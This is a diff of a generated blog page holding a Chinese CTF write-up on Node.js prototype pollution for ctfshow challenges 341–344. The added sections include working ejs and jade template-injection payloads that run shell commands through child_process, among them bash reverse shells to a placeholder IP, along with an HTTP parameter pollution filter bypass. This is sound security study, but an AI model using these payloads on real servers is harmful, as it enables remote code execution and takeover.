@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>nodejs&amp;原型链污染 - wo02ie</title>
+  <title>wo02ie</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="nodejs&原型链污染">
+            <span class="h2" id="subtitle" title="">
               
             </span>
 
@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      8.5k 字
+      10.1k 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      121
+      146
        分钟
     </span>
   
@@ -237,10 +237,11 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">nodejs&amp;原型链污染</h1>
+            <h1 style="display: none"></h1>
             
             <div class="markdown-body">
-              <h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>：</p>
+              <p>title: ‘nodejs&amp;原型链污染’<br>date: ‎2021-04-30 18:06:41<br>tags: ‘knowledge’<br>categories: ‘cs’<br>hide: false</p>
+<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>：</p>
 <ul>
 <li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li>
 <li><code>DOM</code>（一些操作页面元素的方法）</li>
@@ -512,6 +513,13 @@ keywords - 关键字
 <p>存在影响目标类型的同型，该同型的参数可控</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E6%B1%A1%E6%9F%93.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>原型链污染</strong>利用的关键就是找到可以覆盖的属性或者方法。</p>
+<p>这类漏洞的关键主要是在 compile编译 截断，通过原型链污染覆盖某些属性，在编译过程中注入模板，在渲染的时候就会执行我们注入的恶意代码。</p>
+<p>限制：</p>
+<ul>
+<li>保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常</li>
+<li>被覆盖的属性无硬编码默认值</li>
+</ul>
 <h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h4><p>下载附件</p>
 <blockquote>
 <p>npm install</p>
@@ -548,6 +556,7 @@ keywords - 关键字
 <blockquote>
 <p>Function(query)(query)这种匿名函数的写法，query不再是传数值，而是传入执行代码，然后自执行。有点和eval类似，但这里更好的解释是Function对象</p>
 <p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
+<p>官方是这样定义的：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的  JavaScript 函数。</p>
 </blockquote>
 <p>然后想法是通过login.js的copy污染到api.js的query，反弹一个shell</p>
 <p>js如何反弹shell<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p>
@@ -589,6 +598,180 @@ keywords - 关键字
 <p>这里面的userinfo原型不同了</p>
 <p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211122183340194.png" srcset="/img/loading.gif" lazyload></p>
 <p>再套一个<code>__proto__</code>即可</p>
+<h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow 341"></a>ctfshow 341</h4><p>这里介绍两个自动化找洞：</p>
+<p>snyk的使用</p>
+<p>在官网注册登录，初次登录要关联Github，找到api，本地：</p>
+<blockquote>
+<p>npm install snyk -g </p>
+<p>snyk config set api=</p>
+<p>snyk test</p>
+</blockquote>
+<p>audit的使用</p>
+<blockquote>
+<p>npm audit</p>
+</blockquote>
+<ul>
+<li>ejs</li>
+</ul>
+<p>因为这题没有/api触发点，使用338存在的ejs RCE，因为是非预期没有放出来，使用snyk扫出来</p>
+<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-EJS-1049328">https://security.snyk.io/vuln/SNYK-JS-EJS-1049328</a></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1&quot;</span>&#x27;);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>还有一个入口outputFunctionName：<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注意到login.js的<code>this.userinfo = new function()&#123;...</code>所以上面的payload再嵌套一个<code>__proto__</code></p>
+<h4 id="ctfshow342、343"><a href="#ctfshow342、343" class="headerlink" title="ctfshow342、343"></a>ctfshow342、343</h4><ul>
+<li>jade</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025#toc-2">https://xz.aliyun.com/t/7025#toc-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172124317.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172422442.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172602483.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172725768.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124173907879.png" srcset="/img/loading.gif" lazyload></p>
+<p>js调试真的一坨坨的Orz</p>
+<p>this.engine跟进</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174739562.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续跟进</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174952093.png" srcset="/img/loading.gif" lazyload></p>
+<p>可见返回值处：</p>
+<blockquote>
+<p>return handleTemplateCache(options)(options);</p>
+</blockquote>
+<p>跟进一下handleTemplateCache</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001447005.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟一下compile<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001503138.png" srcset="/img/loading.gif" lazyload></p>
+<p>先看一下parse</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003052754.png" srcset="/img/loading.gif" lazyload></p>
+<p>parser内，tokens被内部parse后传到compiler被compile，赋为js的值，js被部分传入body内</p>
+<p>看一下compile，它是compiler的函数，去node_module找</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003818514.png" srcset="/img/loading.gif" lazyload></p>
+<p>返回buf传回compile</p>
+<p>跟进66行this.visit(this.node);<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082102153.png" srcset="/img/loading.gif" lazyload></p>
+<p>this.debug=true时node.filename被stringify转换为字符串 node.line随着被push进buf</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082655288.png" srcset="/img/loading.gif" lazyload></p>
+<p>this.visitNode(node);遍历ast树后回到compile<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084259360.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084511998.png" srcset="/img/loading.gif" lazyload></p>
+<p>node.line被记录到fn中，然后</p>
+<blockquote>
+<p>fn = new Function(‘locals, jade’, fn);</p>
+</blockquote>
+<p>那么我们的污染点就出来了，<strong>污染到node.line就可以运行代码了</strong></p>
+<h5 id="碰到问题"><a href="#碰到问题" class="headerlink" title="碰到问题"></a>碰到问题</h5><p>post /login</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>监视node.line值</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173326438.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173359572.png" srcset="/img/loading.gif" lazyload></p>
+<p>或者<code>Uncaught ReferenceError: node is not defined</code>，说明node.line存在原始的值，它不会去Object找污染的值</p>
+<p>重新梳理一下调用栈</p>
+<blockquote>
+<p>res.render-&gt;app.render-&gt;tryRender-&gt;view.render-&gt;this.engine</p>
+<ol>
+<li>app.js :: res.render</li>
+<li>jade/lib/index.js :: exports.__express</li>
+<li>jade/lib/index.js :: exports.renderFile<ol>
+<li>jade/lib/index.js :: handleTemplateCache</li>
+</ol>
+</li>
+<li>jade/lib/index.js :: exports.compile<ol>
+<li>jade/lib/index.js :: parse -&gt; compiler.compile();<ol>
+<li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li>
+<li>jade/lib/compiler.js :: this.visit</li>
+<li>jade/lib/compiler.js :: this.buf.push</li>
+</ol>
+</li>
+<li>jade/lib/index.js :: parse -&gt; options.self</li>
+<li>jade/lib/index.js :: fn = new Function(‘locals, jade’, fn)</li>
+<li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<p>进入app.render后可以看到获取了options，触发app渲染引擎进行渲染</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125170700643.png" srcset="/img/loading.gif" lazyload></p>
+<p>系列参数设置继续步过，进入tryRender</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173138254.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到，寻找到app的渲染引擎，并且设置为jade，开始渲染</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173338485.png" srcset="/img/loading.gif" lazyload></p>
+<p>this.engine进入jade库</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173430135.png" srcset="/img/loading.gif" lazyload></p>
+<p>回到node.line打一下看看</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174150498.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>TypeError: this[(“visit” + node.type)] is not a function</p>
+</blockquote>
+<p>找到Compiler.visitNode，打个断点</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174434191.png" srcset="/img/loading.gif" lazyload></p>
+<p>拼接发现没有这个方法，遍历ast树，通常是通过“visit+节点类型”来遍历所有节点的，观察光标，按照他的默认值设置为Block</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126183747677.png" srcset="/img/loading.gif" lazyload></p>
+<p>节点类型不合要求，测试所有节点类型如下：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitAttributes</span><br>visitEach<br>visitCode √<br>visitBlockComment√<br>visitComment√<br>visitText<br>visitFilter<br>visitTag<br>visitMixin<br>visitDoctype√<br>visitMixinBlock√<br>visitBlock<br>visitLiteral<br>visitWhen<br>visitCase<br>visitNode<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126184235129.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>TypeError: plugin is not a function</p>
+</blockquote>
+<p>看报错还没有进入渲染完成，找到jade渲染完前的最后报错</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126212401866.png" srcset="/img/loading.gif" lazyload></p>
+<p>是一个判断，打进去的时候self是undefined，可以污染</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231450129.png" srcset="/img/loading.gif" lazyload></p>
+<p>污染title</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231900595.png" srcset="/img/loading.gif" lazyload></p>
+<p>污染message</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126232004589.png" srcset="/img/loading.gif" lazyload></p>
+<p>污染error，一开始传了一个1，传json格式的内容</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">,<span class="hljs-string">&quot;error&quot;</span>:&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;stack&quot;</span>:<span class="hljs-string">&quot;runing&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>补充，其实污染目标就是node.line，一开始就污染node.line就可以知道只污染哪些属性即可，因为有些属性不配置的话，它要么有默认值，要么就是能部分渲染没完成，不影响我们的污染数据的执行</p>
+<p>对于普通模板，只需要污染self和line，有继承的模板需要污染type</p>
+<p>当有顶格h=title类型的需要污染block类型</p>
+<p>jade入口：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.__express = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">path, options, fn</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(options.compileDebug == <span class="hljs-literal">undefined</span> &amp;&amp; process.env.NODE_ENV === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>    options.compileDebug = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-built_in">exports</span>.renderFile(path, options, fn);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>options.compileDebug</code> 无初始值，可以覆盖开启 Debug 模式，当然也有另外一种情况，部署时，没有正确配置 <code>req.app.get(&#39;env&#39;)</code> 导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>另外<strong>this.debug</strong>哪里来？？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Compiler = <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Compiler</span>(<span class="hljs-params">node, options</span>) </span>&#123;<br>  <span class="hljs-built_in">this</span>.debug = <span class="hljs-literal">false</span> !== options.compileDebug;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>最终Exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>,<br><span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;Code&quot;</span>,<br><span class="hljs-attr">&quot;self&quot;</span>:<span class="hljs-number">1</span><br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>来个全家福</p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211127000013927.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="ctfshow-344"><a href="#ctfshow-344" class="headerlink" title="ctfshow 344"></a>ctfshow 344</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">if</span>(req.url.match(<span class="hljs-regexp">/8c|2c|\,/ig</span>))&#123;<br>  	res.end(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-built_in">JSON</span>.parse(req.query.query);<br>  <span class="hljs-keyword">if</span>(query.name===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;query.password===<span class="hljs-string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.isVIP===<span class="hljs-literal">true</span>)&#123;<br>  	res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  	res.end(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>不能有8c、2c、逗号</p>
+<p>正常请求：</p>
+<blockquote>
+<p>?query={“name”:”admin”,”password”:”ctfshow”,”isVIP”:true}</p>
+</blockquote>
+<p>这里介绍一下HPP数据污染</p>
+<blockquote>
+<p>Web服务器 　　　　　　 参数获取函数 　　　　　　　　　　   获取到的参数</p>
+<p>PHP/Apache　　 　　  $_GET(“par”) 　　　　　　　　　　 Last</p>
+<p>JSP/Tomcat 　　　　  Request.getParameter(“par”)    First</p>
+<p>Perl(CGI)/Apache 　 Param(“par”) 　　　　　　　　　　 First</p>
+<p>Python/Apache 　　  getvalue(“par”) 　　　　　　　　  All(List)</p>
+<p>ASP/IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)</p>
+</blockquote>
+<p>而nodejs就是会将同名参数以数组进行存储，json.parse也能正常解析</p>
+<blockquote>
+<p>?query={“name”:”admin”&amp;query=”password”:”ctfshow”&amp;query=”isVIP”:true}</p>
+</blockquote>
+<p>逗号已经绕过，url编码看一下</p>
+<blockquote>
+<p>%3Fquery%3D%7B%22name%22%3A%22admin%22%26query%3D%22password%22%3A%22ctfshow%22%26query%3D%22isVIP%22%3Atrue%7D</p>
+</blockquote>
+<p>ctfshow前面出现了一个%22，是双引号，和c成了2c，c得绕一下，进行unicode编码一下%63</p>
+<p>payload：</p>
+<blockquote>
+<p>?query={“name”:”admin”&amp;query=”password”:”%63tfshow”&amp;query=”isVIP”:true}</p>
+</blockquote>
 <h4 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a>hackit 2018</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<br> <br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br> <br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>        <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>            merge(a[attr], b[attr]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a[attr] = b[attr];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">a</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br> <br><span class="hljs-comment">// Constants</span><br><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span>;<br><span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>;<br><span class="hljs-keyword">const</span> admin = &#123;&#125;;<br> <br><span class="hljs-comment">// App</span><br><span class="hljs-keyword">const</span> app = express();<br>app.use(bodyParser.json())<br>app.use(cookieParser());<br> <br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)));<br>app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body));<br>    <span class="hljs-keyword">var</span> copybody = clone(body)<br>    <span class="hljs-keyword">if</span> (copybody.name) &#123;<br>        res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;<br>            <span class="hljs-string">&quot;done&quot;</span>: <span class="hljs-string">&quot;cookie set&quot;</span><br>        &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.json(&#123;<br>            <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;cookie not set&quot;</span><br>        &#125;)<br>    &#125;<br>&#125;);<br>app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> аdmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))<br>    <span class="hljs-keyword">if</span> (admin.аdmin == <span class="hljs-number">1</span>) &#123;<br>        res.send(<span class="hljs-string">&quot;hackim19&#123;&#125;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;You are not authorized&quot;</span>);<br>    &#125;<br>&#125;);<br>app.listen(PORT, HOST);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br></code></pre></td></tr></table></figure>
 
 <p>payload</p>
@@ -617,20 +800,6 @@ keywords - 关键字
             <div>
               <div class="post-metas mb-3">
                 
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/cs/">cs</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
-                    
-                  </div>
                 
               </div>
               
